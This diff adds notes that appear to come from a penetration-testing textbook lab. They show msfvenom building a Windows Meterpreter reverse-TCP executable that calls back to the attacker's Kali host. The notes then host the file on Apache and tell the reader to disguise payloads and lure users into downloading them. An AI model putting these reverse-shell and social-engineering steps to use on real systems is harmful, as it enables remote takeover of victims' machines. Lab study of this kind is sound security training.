@@ -1,0 +1,31 @@
+Instead of relying on a missing patch or other security issue, we are hoping to exploit the one security issue that may never be fully patched: THE USERS. 
+
+Msfvenom allows you to build standalone payloads to run on a target system in an attempt to exploit the user whether through a social-engineering attack (Chapter 11) or by uploading a payload to a vulnerable server, as we’ll see in Chapter 8. 
+
+ root@kali:~#msfvenom -h
+ To list all the available payloads, enter
+ root@kali:~#msfvenom -l payloads
+ 
+ root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp -o
+
+our LHOST needs to be set, and our LPORT is set to the default
+4444. For practice, set LPORT to 12345 by entering LPORT=12345. We also see EXITFUNC, which we can leave as the default. Because this is a reverse connection payload, we need to set our LHOST option to tell the target machine where to connect back to (our Kali machine). 
+
+Now tell Msfvenom which output format to use. To see all available output formats, enter 
+root@kali:~# msfvenom --help-formats.
+
+root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=12345 -f exe > chapter4example.exe
+
+verify:
+root@kali:~# file chapter4example.exe
+
+One good way to serve up payloads is to host them on a web server, disguise them as something useful, and lure users into downloading them. For this example, we’ll host our Metasploit executable on our Kali machine’s builtin Apache server and browse to the file from our target machine. 
+
+First, run cp chapter4example.exe /var/www to copy the payload executable to the Apache directory, and then make sure the web server is started with service apache2 start.
+
+root@kali:~# cp chapter4example.exe /var/www
+root@kali:~# service apache2 start
+
+
+Now switch to your Windows XP target and open Internet Explorer.
+Browse to http://kali/chapter4example.exe and download the file.
